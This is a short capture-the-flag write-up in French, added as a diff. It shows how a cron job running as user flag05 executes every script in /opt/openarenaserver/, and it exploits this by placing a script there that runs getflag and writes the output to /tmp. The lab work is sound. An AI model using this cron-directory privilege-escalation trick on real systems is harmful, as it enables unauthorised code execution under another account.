@@ -1,0 +1,20 @@
+cat $MAIL
+
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+on voit que cette commande est executee toutes les 2 minutes avec cron
+
+on regarde le script
+
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+done
+
+
+on place un script a executer dans /opt/openarenaserver/ qui fait simplement un getflag
+/bin/getflag > /tmp/flag
+
+:)
